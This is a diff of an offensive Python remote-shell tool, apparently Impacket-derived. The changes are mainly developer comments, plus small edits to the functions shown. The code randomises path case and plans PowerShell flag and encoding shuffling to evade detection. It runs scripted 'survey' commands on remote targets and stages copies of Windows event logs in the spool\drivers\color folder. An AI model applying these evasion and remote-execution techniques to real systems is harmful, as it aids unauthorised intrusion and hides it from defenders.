@@ -51,7 +51,7 @@ CODEC = sys.stdout.encoding
 
 def temp_perm(option):
     """
-    Function will create a permutation on the Temp directory altering it case
+    Function will create a permutation on the Temp directory altering its case, results in upper and lower case mix
 
     Return: a random case on Temp
     """
@@ -95,7 +95,7 @@ class RemoteShell(cmd.Cmd):
         self.__outputBuffer = str('')
         self.__shell = temp_perm("cmd") + ' /Q /c '
         self.__shell_type = shell_type
-        # call function here that will generate random encoding schemes here
+        # call function here that will generate random encoding schemes here, in addition to shuffling order of flags where we can
         # -NOL --> No Logo
         # -NOP --> No execution profile
         # -STA --> Single Threaded Apartment
@@ -181,6 +181,7 @@ class RemoteShell(cmd.Cmd):
             try:
                 logging.info("Saving all output from survey to survey.txt in your local pwd")
                 logging.info("Starting Survey")
+                # can have issues here if survey with save option is run on multiple tgts. Should append remote host ip or atleast a timestamp...
                 local_save_file = open("survey.txt", "a")
 
                 config_file = open("survey.conf", "r+")
@@ -205,11 +206,6 @@ class RemoteShell(cmd.Cmd):
                     print("[*] %s" % (item))
                     self.execute_remote(item.strip('\n'))
                     time.sleep(1)
-                    '''
-                    if len(self.__outputBuffer.strip('\r\n')) > 0:
-                        print(self.__outputBuffer)
-                        self.__outputBuffer = ''
-                    '''
                     self.format_print_buff()
                 logging.info("Survey Completed")
             except Exception as e:
@@ -220,6 +216,8 @@ class RemoteShell(cmd.Cmd):
             prefix = 'copy '
             log_file_name = s
             file_path = 'C:\Windows\System32\Winevt\Logs\\'
+            # should add additional directories to copy to if below doesnt exist for some reason
+            # should always be there, but you never know, get a list and iterate over with a try: except:
             remote_copy = ' C:\Windows\system32\spool\drivers\color'
             combined_command = prefix + '"' + file_path + s + '"' + remote_copy
             self.execute_remote(combined_command)
@@ -274,6 +272,8 @@ class RemoteShell(cmd.Cmd):
 
     # add md5 before after 
     # add a progress bar. see how ivan does his 
+    # import tqdm
+
     def do_lget(self, src_path):
 
         try:
@@ -330,7 +330,7 @@ class RemoteShell(cmd.Cmd):
         else:
             path = s.split(" ")[0]
             try:
-                self.execute_remote('dir /A /N /O:D %s' % path)
+                self.execute_remote('dir /A /N /O:D "%s"' % path)
                 self.format_print_buff()
             except Exception as e:
                 print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
